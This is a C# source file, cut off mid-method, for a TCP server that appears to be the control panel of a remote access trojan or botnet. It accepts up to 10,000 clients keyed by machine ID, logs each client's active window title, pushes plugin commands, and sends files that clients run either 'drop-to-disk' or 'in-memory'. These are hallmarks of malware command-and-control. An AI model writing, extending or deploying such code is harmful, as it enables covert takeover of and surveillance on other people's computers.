#nullable disable

using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Runtime.Versioning;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using WpfApp.Plugins;

namespace WpfApp
{
    [SupportedOSPlatform("windows")]
    public class TcpServer : IDisposable
    {
        private readonly MainWindow _ui;
        private readonly X509Certificate2 _certificate;
        private readonly int _port;
        private readonly string _serverPassword;
        private readonly CancellationTokenSource _cts = new();

        private TcpListener _listener;
        private PluginHost _pluginHost;
        private volatile bool _isRunning;

        // Indexed by machineId (raw ID from client handshake) � this is the ONLY key
        private readonly ConcurrentDictionary<string, ClientConnection> _clients = new();

        // File queue: always indexed by raw machineId
        private readonly ConcurrentDictionary<string, ConcurrentQueue<QueuedFile>> _fileQueue = new();

        private readonly ConcurrentDictionary<string, RateCounter> _rateCounters = new();
        private readonly ConcurrentDictionary<string, SemaphoreSlim> _connectionLocks = new();

        // Tracks which raw machineIds have already had their initial client info reported
        // to prevent duplicate "Client connected" events from MSG_CLIENT_INFO
        private readonly ConcurrentDictionary<string, bool> _initialInfoReported = new();

        private readonly Timer _clientCleanupTimer;
        private readonly Timer _rateLimitCleanupTimer;

        private const int MaxMessageSize = 50 * 1024 * 1024 + 1024;
        private const int MaxFileSizeBytes = 50 * 1024 * 1024;
        private const int MaxConnectedClients = 10000; // Increased limit
        private const int ClientTimeoutSeconds = 60;
        private const int RequestsPerMinuteLimit = int.MaxValue; // Effectively disables rate limiting
        private const int HandshakeTimeoutMs = 10000;

        private const byte EXEC_MODE_DROP_TO_DISK = 0x00;
        private const byte EXEC_MODE_IN_MEMORY = 0x01;

        // Client -> Server
        private const byte MSG_AUTH = 0x01;
        private const byte MSG_HEARTBEAT = 0x02;
        private const byte MSG_PLUGIN_DATA = 0x10;
        private const byte MSG_PLUGIN_BATCH = 0x11;
        private const byte MSG_CLIENT_INFO = 0x03;
        private const byte MSG_ACTIVE_WINDOW = 0x04;

        // Server -> Client
        private const byte MSG_AUTH_OK = 0x81;
        private const byte MSG_AUTH_FAIL = 0x82;
        private const byte MSG_HEARTBEAT_ACK = 0x83;
        private const byte MSG_PLUGIN_CMD = 0x90;
        private const byte MSG_FILE_TRANSFER = 0x91;
        private const byte MSG_DISCONNECT = 0xFF;

        private long _totalCommandsSent;
        private long _connectionIdCounter;

        public TcpServer(MainWindow ui, int port, X509Certificate2 certificate, string serverPassword = "")
        {
            _ui = ui ?? throw new ArgumentNullException(nameof(ui));
            _certificate = certificate ?? throw new ArgumentNullException(nameof(certificate));
            _port = port;
            _serverPassword = serverPassword ?? "";

            if (!certificate.HasPrivateKey)
                throw new ArgumentException("Certificate must have a private key.", nameof(certificate));

            _clientCleanupTimer = new Timer(_ => CleanupStaleClients(), null,
                TimeSpan.FromSeconds(30), TimeSpan.FromSeconds(30));
            _rateLimitCleanupTimer = new Timer(_ => CleanupRateLimits(), null,
                TimeSpan.FromMinutes(2), TimeSpan.FromMinutes(2));
        }

        public void SetPluginHost(PluginHost host) => _pluginHost = host;

        // ==================== START / STOP ====================

        public void Start()
        {
            if (_isRunning) return;

            _listener = new TcpListener(IPAddress.Any, _port);
            _listener.Server.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
            // Increase backlog to handle more simultaneous connections
            _listener.Start(1000);

            _isRunning = true;

            _ui.AppendLog($"TCP server started on port {_port}");

            Task.Run(() => AcceptLoop(_cts.Token));
        }

        public void Stop()
        {
            if (!_isRunning) return;
            _isRunning = false;
            _cts.Cancel();

            foreach (var kvp in _clients)
            {
                try { kvp.Value.Dispose(); } catch { }
            }
            _clients.Clear();
            _fileQueue.Clear();
            _initialInfoReported.Clear();

            try { _listener?.Stop(); } catch { }

            _ui.AppendLog("TCP server stopped.");
        }

        public string GetScheme() => "tcp";

        // ==================== ID RESOLUTION HELPERS ====================

        private string ToRawId(string id)
        {
            if (string.IsNullOrWhiteSpace(id)) return id;

            if (_clients.ContainsKey(id))
                return id;

            string rawId = _ui.ResolveRawClientId(id);
            if (rawId != null && rawId != id && _clients.ContainsKey(rawId))
                return rawId;

            return id;
        }

        private string ToDisplayId(string rawId)
        {
            if (string.IsNullOrWhiteSpace(rawId)) return rawId;
            return _ui.ResolveStableClientId(rawId);
        }

        private ClientConnection FindConnection(string id)
        {
            if (string.IsNullOrWhiteSpace(id)) return null;

            if (_clients.TryGetValue(id, out var conn))
                return conn;

            string rawId = _ui.ResolveRawClientId(id);
            if (rawId != null && rawId != id && _clients.TryGetValue(rawId, out conn))
                return conn;

            return null;
        }

        // ==================== ACCEPT LOOP ====================

        private async Task AcceptLoop(CancellationToken ct)
        {
            while (_isRunning && !ct.IsCancellationRequested)
            {
                try
                {
                    var tcpClient = await _listener.AcceptTcpClientAsync();

                    if (_clients.Count >= MaxConnectedClients)
                    {
                        _ui.AppendLog($"Rejected connection: max clients reached");
                        tcpClient.Close();
                        continue;
                    }

                    tcpClient.NoDelay = true;
                    tcpClient.ReceiveBufferSize = 1048576;
                    tcpClient.SendBufferSize = 1048576;
                    tcpClient.ReceiveTimeout = ClientTimeoutSeconds * 1000;
                    tcpClient.SendTimeout = 30000;

                    string remoteIp = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address.ToString();

                    // Rate limiting removed to allow all clients to connect

                    _ = Task.Run(() => HandleClientConnection(tcpClient, remoteIp, ct));
                }
                catch (ObjectDisposedException) { break; }
                catch (SocketException) when (ct.IsCancellationRequested) { break; }
                catch (Exception ex)
                {
                    if (!ct.IsCancellationRequested)
                        _ui.AppendLog($"Accept error: {ex.Message}");
                }
            }
        }

        // ==================== CLIENT CONNECTION HANDLER ====================

        private async Task HandleClientConnection(TcpClient tcpClient, string remoteIp, CancellationToken ct)
        {
            Stream stream = null;
            ClientConnection connection = null;
            string machineId = null;
            string clientInfo = null;
            long connectionId = Interlocked.Increment(ref _connectionIdCounter);

            try
            {
                var netStream = tcpClient.GetStream();
                stream = netStream;

                byte[] rsaPubKey;
                using (var csp = new RSACryptoServiceProvider())
                {
                    csp.ImportRSAPublicKey(_certificate.GetRSAPublicKey().ExportRSAPublicKey(), out _);
                    rsaPubKey = csp.ExportCspBlob(false);
                }
                byte[] lenBuf = new byte[4];
                lenBuf[0] = (byte)(rsaPubKey.Length & 0xFF);
                lenBuf[1] = (byte)((rsaPubKey.Length >> 8) & 0xFF);
                lenBuf[2] = (byte)((rsaPubKey.Length >> 16) & 0xFF);
                lenBuf[3] = (byte)((rsaPubKey.Length >> 24) & 0xFF);
                await stream.WriteAsync(lenBuf, 0, 4, ct);
                await stream.WriteAsync(rsaPubKey, 0, rsaPubKey.Length, ct);
                await stream.FlushAsync(ct);

                byte[] keyLenBuf = new byte[4];
                if (!await ReadExactRaw(stream, keyLenBuf, 0, 4, ct))
                { tcpClient.Close(); return; }
                int encKeyLen = keyLenBuf[0] | (keyLenBuf[1] << 8) | (keyLenBuf[2] << 16) | (keyLenBuf[3] << 24);
                if (encKeyLen <= 0 || encKeyLen > 512)
                { tcpClient.Close(); return; }
                byte[] encAesKey = new byte[encKeyLen];
                if (!await ReadExactRaw(stream, encAesKey, 0, encKeyLen, ct))
                { tcpClient.Close(); return; }

                byte[] aesKey = SecureChannel.DecryptAesKey(encAesKey, _certificate.GetRSAPrivateKey());

                var handshakeResult = await PerformHandshake(stream, aesKey, remoteIp);
                if (handshakeResult == null)
                {
                    tcpClient.Close();
                    return;
                }

                machineId = handshakeResult.Value.MachineId;
                clientInfo = handshakeResult.Value.ClientInfo;

                var connLock = _connectionLocks.GetOrAdd(machineId, _ => new SemaphoreSlim(1, 1));

                await connLock.WaitAsync(ct);
                try
                {
                    // Remove old connection if exists � do NOT fire disconnect for replacement
                    if (_clients.TryRemove(machineId, out var oldConn))
                    {
                        _ui.AppendVerboseLog($"Replacing connection for {machineId}");
                        oldConn.Cancel();
                        try { oldConn.Dispose(); } catch { }
                    }

                    connection = new ClientConnection(machineId, connectionId, tcpClient, stream, remoteIp, aesKey);
                    _clients[machineId] = connection;
                }
                finally
                {
                    connLock.Release();
                }

                _ui.UpdateClientCount(_clients.Count);

                // Report client info ONCE per connection lifecycle.
                // Mark this machineId so MSG_CLIENT_INFO won't duplicate it.
                _initialInfoReported[machineId] = true;

                if (!string.IsNullOrEmpty(clientInfo))
                {
                    _ui.OnHttpClientInfo(machineId, clientInfo);
                }

                await FlushPendingCommands(machineId, connection);
                await SendQueuedFile(connection);

                await MessageLoop(connection, ct);
            }
            catch (OperationCanceledException) { }
            catch (Exception ex)
            {
                if (!ct.IsCancellationRequested && connection?.IsCancelled != true)
                    _ui.AppendLog($"Client {machineId ?? remoteIp} error: {ex.Message}");
            }
            finally
            {
                if (machineId != null && connection != null)
                {
                    var connLock = _connectionLocks.GetOrAdd(machineId, _ => new SemaphoreSlim(1, 1));
                    await connLock.WaitAsync();
                    try
                    {
                        // Only fire disconnect if THIS connection is still the registered one
                        if (_clients.TryGetValue(machineId, out var currentConn) &&
                            currentConn.ConnectionId == connectionId)
                        {
                            _clients.TryRemove(machineId, out _);
                            _initialInfoReported.TryRemove(machineId, out _);
                            _ui.UpdateClientCount(_clients.Count);

                            _ui.OnClientDisconnected(machineId);

                            if (_pluginHost != null)
                            {
                                string displayId = ToDisplayId(machineId);
                                try { await _pluginHost.OnClientDisconnected(displayId); } catch { }
                            }
                        }
                        // If a different connection replaced us, do NOT fire disconnect
                    }
                    finally
                    {
                        connLock.Release();
                    }
                }

                connection?.Dispose();
                if (connection == null)
                {
                    try { stream?.Dispose(); } catch { }
                    try { tcpClient?.Close(); } catch { }
                }
            }
        }

        // ==================== HANDSHAKE ====================

        private struct HandshakeResult
        {
            public string MachineId;
            public string ClientInfo;
        }

        private async Task<HandshakeResult?> PerformHandshake(Stream stream, byte[] aesKey, string remoteIp)
        {
            try
            {
                using var handshakeCts = new CancellationTokenSource(HandshakeTimeoutMs);
                var (msgType, payload) = await SecureChannel.ReadEncryptedMessage(stream, aesKey, handshakeCts.Token);

                if (msgType != MSG_AUTH || payload == null)
                {
                    await SecureChannel.WriteEncryptedMessage(stream, MSG_AUTH_FAIL,
                        Encoding.UTF8.GetBytes("Invalid handshake"), aesKey);
                    return null;
                }

                string machineId, clientInfoStr, clientPassword;
                try
                {
                    var json = Encoding.UTF8.GetString(payload);
                    using var doc = JsonDocument.Parse(json);
                    var root = doc.RootElement;

                    machineId = root.TryGetProperty("machine_id", out var m) ? m.GetString() : null;
                    clientInfoStr = root.TryGetProperty("info", out var i) ? i.GetString() : null;
                    clientPassword = root.TryGetProperty("password", out var p) ? p.GetString() : null;
                }
                catch
                {
                    await SecureChannel.WriteEncryptedMessage(stream, MSG_AUTH_FAIL,
                        Encoding.UTF8.GetBytes("Authentication failed"), aesKey);
                    return null;
                }

                if (string.IsNullOrEmpty(machineId))
                {
                    await SecureChannel.WriteEncryptedMessage(stream, MSG_AUTH_FAIL,
                        Encoding.UTF8.GetBytes("Authentication failed"), aesKey);
                    return null;
                }

                if (!string.IsNullOrEmpty(_serverPassword))
                {
                    if (string.IsNullOrEmpty(clientPassword))
                    {
                        await SecureChannel.WriteEncryptedMessage(stream, MSG_AUTH_FAIL,
                            Encoding.UTF8.GetBytes("Password required"), aesKey);
                        return null;
                    }

                    if (clientPassword != _serverPassword)
                    {
                        await SecureChannel.WriteEncryptedMessage(stream, MSG_AUTH_FAIL,
                            Encoding.UTF8.GetBytes("Invalid password"), aesKey);
                        return null;
                    }
                }

                await SecureChannel.WriteEncryptedMessage(stream, MSG_AUTH_OK,
                    Encoding.UTF8.GetBytes("OK"), aesKey);

                return new HandshakeResult
                {
                    MachineId = machineId,
                    ClientInfo = clientInfoStr
                };
            }
            catch (OperationCanceledException)
            {
                return null;
            }
            catch (Exception ex)
            {
                _ui.AppendLog($"Handshake error from {remoteIp}: {ex.Message}");
                return null;
            }
        }

        // ==================== MESSAGE LOOP ====================

        private async Task MessageLoop(ClientConnection conn, CancellationToken ct)
        {
            using var linkedCts = CancellationTokenSource.CreateLinkedTokenSource(ct, conn.CancellationToken);
            var token = linkedCts.Token;

            _ = Task.Run(() => CommandPushLoop(conn, token), token);

            while (_isRunning && !token.IsCancellationRequested && conn.IsConnected)
            {
                try
                {
                    var (msgType, payload) = await SecureChannel.ReadEncryptedMessage(conn.Stream, conn.AesKey, token);

                    if (msgType == 0 && payload == null)
                        break;

                    conn.LastSeen = DateTime.UtcNow;

                    switch (msgType)
                    {
                        case MSG_HEARTBEAT:
                            await HandleHeartbeat(conn, payload);
                            break;

                        case MSG_PLUGIN_DATA:
                            await HandlePluginData(conn, payload);
                            break;

                        case MSG_PLUGIN_BATCH:
                            await HandlePluginBatch(conn, payload);
                            break;

                        case MSG_CLIENT_INFO:
                            HandleClientInfo(conn, payload);
                            break;

                        case MSG_ACTIVE_WINDOW:
                            if (payload != null && payload.Length > 0)
                            {
                                string windowTitle = Encoding.UTF8.GetString(payload);
                                _ui.OnActiveWindowUpdate(conn.MachineId, windowTitle);
                            }
                            break;
                    }
                }
                catch (OperationCanceledException) { break; }
                catch (IOException) { break; }
                catch (Exception ex)
                {
                    if (!token.IsCancellationRequested)
                        _ui.AppendLog($"Message loop error for {conn.MachineId}: {ex.Message}");
                    break;
                }
            }
        }

        // ==================== COMMAND PUSH LOOP ====================

        private async Task CommandPushLoop(ClientConnection conn, CancellationToken ct)
        {
            try
            {
                while (_isRunning && !ct.IsCancellationRequested && conn.IsConnected)
                {
                    try
                    {
                        await conn.CommandSignal.WaitAsync(ct);
                    }
                    catch (OperationCanceledException)
                    {
                        break;
                    }

                    if (!conn.IsConnected || ct.IsCancellationRequested)
                        break;

                    try { await Task.Delay(10, ct); } catch (OperationCanceledException) { break; }

                    while (conn.CommandSignal.CurrentCount > 0)
                    {
                        try { await conn.CommandSignal.WaitAsync(TimeSpan.Zero); }
                        catch { break; }
                    }

                    try
                    {
                        await FlushPendingCommands(conn.MachineId, conn);
                        await SendQueuedFile(conn);
                    }
                    catch (IOException) { break; }
                    catch (ObjectDisposedException) { break; }
                    catch (Exception ex)
                    {
                        if (!ct.IsCancellationRequested)
                            _ui.AppendLog($"Push error for {conn.MachineId}: {ex.Message}");
                    }
                }
            }
            catch (OperationCanceledException) { }
            catch (ObjectDisposedException) { }
        }

        // ==================== NOTIFY METHODS ====================

        public void NotifyPendingCommand(string clientId)
        {
            var conn = FindConnection(clientId);
            if (conn != null && conn.IsConnected)
            {
                try { conn.CommandSignal.Release(); } catch { }
            }
        }

        // ==================== MESSAGE HANDLERS ====================

        private async Task HandleHeartbeat(ClientConnection conn, byte[] payload)
        {
            string rawId = conn.MachineId;
            string displayId = ToDisplayId(rawId);

            int pendingCount = 0;
            if (_pluginHost != null)
            {
                pendingCount = _pluginHost.GetPendingCommandCount(displayId);
            }

            bool fileQueued = HasQueuedFiles(rawId);

            byte[] response = new byte[5];
            response[0] = (byte)(pendingCount & 0xFF);
            response[1] = (byte)((pendingCount >> 8) & 0xFF);
            response[2] = (byte)((pendingCount >> 16) & 0xFF);
            response[3] = (byte)((pendingCount >> 24) & 0xFF);
            response[4] = fileQueued ? (byte)1 : (byte)0;

            await conn.SendMessage(MSG_HEARTBEAT_ACK, response);

            if (pendingCount > 0 || fileQueued)
            {
                try { conn.CommandSignal.Release(); } catch { }
            }
        }

        private async Task HandlePluginData(ClientConnection conn, byte[] payload)
        {
            if (_pluginHost == null || payload == null || payload.Length < 2)
                return;

            int idLen = payload[0];
            if (idLen <= 0 || idLen + 1 > payload.Length)
                return;

            string pluginId = Encoding.UTF8.GetString(payload, 1, idLen);
            byte[] data = new byte[payload.Length - 1 - idLen];
            if (data.Length > 0)
                Buffer.BlockCopy(payload, 1 + idLen, data, 0, data.Length);

            string displayId = ToDisplayId(conn.MachineId);

            await _pluginHost.OnClientPluginData(displayId, pluginId, data);
        }

        private async Task HandlePluginBatch(ClientConnection conn, byte[] payload)
        {
            if (_pluginHost == null || payload == null || payload.Length < 1)
                return;

            string displayId = ToDisplayId(conn.MachineId);

            int offset = 0;

            while (offset < payload.Length)
            {
                if (offset + 1 > payload.Length) break;
                int idLen = payload[offset++];

                if (offset + idLen > payload.Length) break;
                string pluginId = Encoding.UTF8.GetString(payload, offset, idLen);
                offset += idLen;

                if (offset + 4 > payload.Length) break;
                int frameCount = payload[offset]
                               | (payload[offset + 1] << 8)
                               | (payload[offset + 2] << 16)
                               | (payload[offset + 3] << 24);
                offset += 4;

                for (int i = 0; i < frameCount && offset + 4 <= payload.Length; i++)
                {
                    int frameLen = payload[offset]
                                 | (payload[offset + 1] << 8)
                                 | (payload[offset + 2] << 16)
                                 | (payload[offset + 3] << 24);
                    offset += 4;

                    if (frameLen <= 0 || offset + frameLen > payload.Length) break;

                    byte[] frameData = new byte[frameLen];
                    Buffer.BlockCopy(payload, offset, frameData, 0, frameLen);
                    offset += frameLen;

                    await _pluginHost.OnClientPluginData(displayId, pluginId, frameData);
                }
            }
        }

        /// <summary>
        /// Handles MSG_CLIENT_INFO received during message loop.
        /// This is an UPDATE � the initial info was already reported during handshake.
        /// We only forward it if this connection is still the active one,
        /// and we suppress it if the handshake info hasn't been processed yet.
        /// </summary>
        private void HandleClientInfo(ClientConnection conn, byte[] payload)
        {
            if (payload == null || payload.Length == 0) return;

            // Guard: only process if this connection is still the active one
            if (!_clients.TryGetValue(conn.MachineId, out var current) ||
                current.ConnectionId != conn.ConnectionId)
                return;

            // Only allow updates � the initial report is handled in HandleClientConnection
            // If for some reason initial info wasn't reported yet, skip this to avoid races
            if (!_initialInfoReported.ContainsKey(conn.MachineId))
                return;

            string info = Encoding.UTF8.GetString(payload);

            // Call the update-only path that won't create a new client entry
            _ui.OnClientInfoUpdate(conn.MachineId, info);
        }

        // ==================== SEND TO CLIENT ====================

        public async Task SendPluginCommand(string clientId, string pluginId, byte[] data)
        {
            var conn = FindConnection(clientId);
            if (conn == null || !conn.IsConnected)
                return;

            byte[] idBytes = Encoding.UTF8.GetBytes(pluginId);
            byte[] payload = new byte[1 + idBytes.Length + data.Length];
            payload[0] = (byte)idBytes.Length;
            Buffer.BlockCopy(idBytes, 0, payload, 1, idBytes.Length);
            Buffer.BlockCopy(data, 0, payload, 1 + idBytes.Length, data.Length);

            await conn.SendMessage(MSG_PLUGIN_CMD, payload);
            Interlocked.Increment(ref _totalCommandsSent);
        }

        private async Task FlushPendingCommands(string machineId, ClientConnection conn)
        {
            if (_pluginHost == null) return;

            if (!_clients.TryGetValue(machineId, out var current) ||
                current.ConnectionId != conn.ConnectionId)
                return;

            string displayId = ToDisplayId(machineId);

            var commands = _pluginHost.GetPendingCommands(displayId);

            if (commands == null)
                return;

            foreach (var cmd in commands)
            {
                if (cmd.Payload != null && !string.IsNullOrEmpty(cmd.PluginId))
                {
                    byte[] idBytes = Encoding.UTF8.GetBytes(cmd.PluginId);
                    byte[] payload = new byte[1 + idBytes.Length + cmd.Payload.Length];
                    payload[0] = (byte)idBytes.Length;
                    Buffer.BlockCopy(idBytes, 0, payload, 1, idBytes.Length);
                    Buffer.BlockCopy(cmd.Payload, 0, payload, 1 + idBytes.Length, cmd.Payload.Length);

                    await conn.SendMessage(MSG_PLUGIN_CMD, payload);
                    Interlocked.Increment(ref _totalCommandsSent);
                }
            }
        }

        // ==================== FILE TRANSFER ====================

        public void EnqueueFileForClient(string clientId, string filePath, string fileHash,
            MainWindow.ExecutionMode execMode = MainWindow.ExecutionMode.DropToDisk)
        {
            if (string.IsNullOrWhiteSpace(clientId) || string.IsNullOrWhiteSpace(filePath)) return;

            var fi = new FileInfo(filePath);
            if (!fi.Exists || fi.Length > MaxFileSizeBytes)
            {
                _ui.AppendLog($"File rejected: {(fi.Exists ? "exceeds 50MB" : "not found")}");
                return;
            }

            string rawId = ToRawId(clientId);
            string displayId = ToDisplayId(rawId);

            string modeStr = execMode == MainWindow.ExecutionMode.InMemory ? "in-memory" : "drop-to-disk";

            var queuedFile = new QueuedFile
            {
                FilePath = filePath,
                FileHash = fileHash,
                ExecMode = execMode
            };

            var queue = _fileQueue.GetOrAdd(rawId, _ => new ConcurrentQueue<QueuedFile>());
            queue.Enqueue(queuedFile);

            _ui.AppendLog($"File queued for {displayId}: {fi.Name} ({fi.Length:N0} bytes, {modeStr})");

            if (_clients.TryGetValue(rawId, out var conn) && conn.IsConnected)
            {
                try { conn.CommandSignal.Release(); } catch { }
            }
        }

        private async Task SendQueuedFile(ClientConnection conn)
        {
            if (!_fileQueue.TryGetValue(conn.MachineId, out var queue) || !queue.TryDequeue(out var qf))
            {
                CleanupEmptyFileQueue(conn.MachineId);
                return;
            }

            if (!_clients.TryGetValue(conn.MachineId, out var current) ||
                current.ConnectionId != conn.ConnectionId)
            {
                queue.Enqueue(qf);
                return;
            }

            if (!File.Exists(qf.FilePath))
            {
                _ui.AppendLog($"Queued file no longer exists: {qf.FilePath}");
                CleanupEmptyFileQueue(conn.MachineId);
                return;
            }

            try
            {
                byte execModeByte = qf.ExecMode == MainWindow.ExecutionMode.InMemory
                    ? EXEC_MODE_IN_MEMORY
                    : EXEC_MODE_DROP_TO_DISK;

                string modeStr = qf.ExecMode == MainWindow.ExecutionMode.InMemory
                    ? "IN-MEMORY" : "DROP-TO-DISK";

                byte[] fileBytes = await File.ReadAllBytesAsync(qf.FilePath);
                byte[] hashBytes = Encoding.UTF8.GetBytes(qf.FileHash ?? "");

                byte[] plainPayload = new byte[1 + 1 + hashBytes.Length + fileBytes.Length];
                int offset = 0;

                plainPayload[offset++] = execModeByte;
                plainPayload[offset++] = (byte)hashBytes.Length;
                Buffer.BlockCopy(hashBytes, 0, plainPayload, offset, hashBytes.Length);
                offset += hashBytes.Length;
                Buffer.BlockCopy(fileBytes, 0, plainPayload, offset, fileBytes.Length);

                await conn.SendMessage(MSG_FILE_TRANSFER, plainPayload);

                string displayId = ToDisplayId(conn.MachineId);
                _ui.AppendLog($"File sent to {displayId}: {Path.GetFileName(qf.FilePath)} ({fileBytes.Length:N0} bytes, {modeStr})");
            }
            catch (Exception ex)
            {
                string displayId = ToDisplayId(conn.MachineId);
                _ui.AppendLog($"File send error for {displayId}: {ex.Message}");
            }
            finally
            {
                CleanupEmptyFileQueue(conn.MachineId);
            }
        }

        private bool HasQueuedFiles(string rawId)
        {
            if (string.IsNullOrWhiteSpace(rawId))
                return false;

            if (_fileQueue.TryGetValue(rawId, out var queue) && !queue.IsEmpty)
                return true;

            CleanupEmptyFileQueue(rawId);
            return false;
        }

        private void CleanupEmptyFileQueue(string rawId)
        {
            if (string.IsNullOrWhiteSpace(rawId))
                return;

            if (_fileQueue.TryGetValue(rawId, out var queue) && queue.IsEmpty)
                _fileQueue.TryRemove(rawId, out _);
        }

        // ==================== WIRE PROTOCOL ====================

        private async Task<(byte msgType, byte[] payload)> ReadMessage(Stream stream, CancellationToken ct)
        {
            byte[] lenBuf = new byte[4];
            if (!await ReadExact(stream, lenBuf, 0, 4, ct))
                return (0, null);

            int totalLen = lenBuf[0]
                         | (lenBuf[1] << 8)
                         | (lenBuf[2] << 16)
                         | (lenBuf[3] << 24);

            if (totalLen <= 0 || totalLen > MaxMessageSize)
                return (0, null);

            byte[] msgBuf = new byte[totalLen];
            if (!await ReadExact(stream, msgBuf, 0, totalLen, ct))
                return (0, null);

            byte msgType = msgBuf[0];
            byte[] payload = null;

            if (totalLen > 1)
            {
                payload = new byte[totalLen - 1];
                Buffer.BlockCopy(msgBuf, 1, payload, 0, totalLen - 1);
            }

            return (msgType, payload);
        }

        private static async Task WriteMessage(Stream stream, byte msgType, byte[] payload,
            CancellationToken ct)
        {
            int payloadLen = payload?.Length ?? 0;
            int totalLen = 1 + payloadLen;

            byte[] packet = new byte[4 + totalLen];
            packet[0] = (byte)(totalLen & 0xFF);
            packet[1] = (byte)((totalLen >> 8) & 0xFF);
            packet[2] = (byte)((totalLen >> 16) & 0xFF);
            packet[3] = (byte)((totalLen >> 24) & 0xFF);
            packet[4] = msgType;

            if (payload != null && payload.Length > 0)
                Buffer.BlockCopy(payload, 0, packet, 5, payload.Length);

            await stream.WriteAsync(packet, 0, packet.Length, ct);
            await stream.FlushAsync(ct);
        }

        private static async Task<bool> ReadExact(Stream stream, byte[] buffer, int offset,
            int count, CancellationToken ct)
        {
            int totalRead = 0;
            while (totalRead < count)
            {
                int read = await stream.ReadAsync(buffer, offset + totalRead,
                    count - totalRead, ct);
                if (read <= 0) return false;
                totalRead += read;
            }
            return true;
        }

        private static Task<bool> ReadExactRaw(Stream stream, byte[] buffer, int offset,
            int count, CancellationToken ct)
        {
            return ReadExact(stream, buffer, offset, count, ct);
        }

        private bool IsRateAllowed(string ip)
        {
            var now = DateTime.UtcNow;
            var counter = _rateCounters.GetOrAdd(ip, _ => new RateCounter { Count = 0, WindowStart = now });

            lock (counter)
            {
                if (now - counter.WindowStart > TimeSpan.FromMinutes(1))
                {
                    counter.WindowStart = now;
                    counter.Count = 0;
                }
                if (counter.Count >= RequestsPerMinuteLimit) return false;
                counter.Count++;
                return true;
            }
        }

        // ==================== CLEANUP ====================

        private void CleanupStaleClients()
        {
            var cutoff = DateTime.UtcNow.AddSeconds(-ClientTimeoutSeconds * 2);
            var stale = _clients.Where(kvp => kvp.Value.LastSeen < cutoff)
                                .Select(kvp => kvp.Key).ToList();

            foreach (var rawId in stale)
            {
                if (_clients.TryGetValue(rawId, out var conn) && conn.LastSeen < cutoff)
                {
                    var connLock = _connectionLocks.GetOrAdd(rawId, _ => new SemaphoreSlim(1, 1));

                    if (!connLock.Wait(0))
                        continue;

                    try
                    {
                        if (!_clients.TryGetValue(rawId, out conn) || conn.LastSeen >= cutoff)
                            continue;

                        if (_clients.TryRemove(rawId, out var removed))
                        {
                            _initialInfoReported.TryRemove(rawId, out _);

                            string displayId = ToDisplayId(rawId);
                            _ui.AppendLog($"Removed stale client: {displayId}");
                            _ui.OnClientDisconnected(rawId);

                            _fileQueue.TryRemove(rawId, out _);

                            if (_pluginHost != null)
                            {
                                try { _pluginHost.OnClientDisconnected(displayId).GetAwaiter().GetResult(); }
                                catch { }
                            }

                            removed.Dispose();
                        }
                    }
                    finally
                    {
                        connLock.Release();
                    }
                }
            }

            if (stale.Count > 0)
                _ui.UpdateClientCount(_clients.Count);
        }

        private void CleanupRateLimits()
        {
            var cutoff = DateTime.UtcNow.AddMinutes(-5);
            var expired = _rateCounters.Where(kvp =>
            {
                lock (kvp.Value) { return kvp.Value.WindowStart < cutoff; }
            }).Select(kvp => kvp.Key).ToList();

            foreach (var key in expired)
                _rateCounters.TryRemove(key, out _);

            var staleLocks = _connectionLocks
                .Where(kvp => !_clients.ContainsKey(kvp.Key))
                .Select(kvp => kvp.Key)
                .ToList();

            foreach (var key in staleLocks)
            {
                if (_connectionLocks.TryGetValue(key, out var sem))
                {
                    if (sem.Wait(0))
                    {
                        try
                        {
                            if (!_clients.ContainsKey(key))
                            {
                                if (_connectionLocks.TryRemove(key, out var removed))
                                {
                                    removed.Release();
                                    try { removed.Dispose(); } catch { }
                                }
                                else
                                {
                                    sem.Release();
                                }
                            }
                            else
                            {
                                sem.Release();
                            }
                        }
                        catch
                        {
                            try { sem.Release(); } catch { }
                        }
                    }
                }
            }
        }

        // ==================== PUBLIC ACCESSORS ====================

        public bool IsClientConnected(string clientId)
        {
            if (string.IsNullOrWhiteSpace(clientId)) return false;

            if (_clients.TryGetValue(clientId, out var c) && c.IsConnected)
                return true;

            string rawId = _ui.ResolveRawClientId(clientId);
            if (rawId != null && rawId != clientId && _clients.TryGetValue(rawId, out c) && c.IsConnected)
                return true;

            return false;
        }

        public int ConnectedClientCount => _clients.Count;

        public IEnumerable<string> GetConnectedClientIds() => _clients.Keys;

        public IEnumerable<string> GetConnectedDisplayIds()
        {
            return _clients.Keys.Select(rawId => ToDisplayId(rawId)).Distinct();
        }

        // ==================== DISPOSE ====================

        public void Dispose()
        {
            Stop();
            _cts?.Dispose();
            _clientCleanupTimer?.Dispose();
            _rateLimitCleanupTimer?.Dispose();

            foreach (var kvp in _connectionLocks)
            {
                try { kvp.Value.Dispose(); } catch { }
            }
            _connectionLocks.Clear();
        }

        // ==================== INNER CLASSES ====================

        private class QueuedFile
        {
            public string FilePath { get; set; }
            public string FileHash { get; set; }
            public MainWindow.ExecutionMode ExecMode { get; set; }
        }

        private class RateCounter
        {
            public int Count;
            public DateTime WindowStart;
        }
    }

    // ==================== CLIENT CONNECTION ====================

    [SupportedOSPlatform("windows")]
    public class ClientConnection : IDisposable
    {
        public string MachineId { get; }
        public long ConnectionId { get; }
        public string RemoteIp { get; }
        public DateTime LastSeen { get; set; }
        public Stream Stream { get; }
        public byte[] AesKey { get; }
        public bool IsConnected => !_disposed && (_tcpClient?.Connected ?? false);
        public bool IsCancelled => _cts.IsCancellationRequested;
        public CancellationToken CancellationToken => _cts.Token;

        public readonly SemaphoreSlim CommandSignal = new(0, int.MaxValue);

        private readonly TcpClient _tcpClient;
        private readonly SemaphoreSlim _writeLock = new(1, 1);
        private readonly CancellationTokenSource _cts = new();
        private bool _disposed;

        public ClientConnection(string machineId, long connectionId, TcpClient tcpClient, Stream stream, string remoteIp, byte[] aesKey)
        {
            MachineId = machineId;
            ConnectionId = connectionId;
            _tcpClient = tcpClient;
            Stream = stream;
            AesKey = aesKey;
            RemoteIp = remoteIp;
            LastSeen = DateTime.UtcNow;
        }

        public void Cancel()
        {
            try { _cts.Cancel(); } catch { }
        }

        public async Task SendMessage(byte msgType, byte[] payload)
        {
            if (_disposed || !IsConnected) return;

            await _writeLock.WaitAsync();
            try
            {
                if (_disposed || !IsConnected) return;
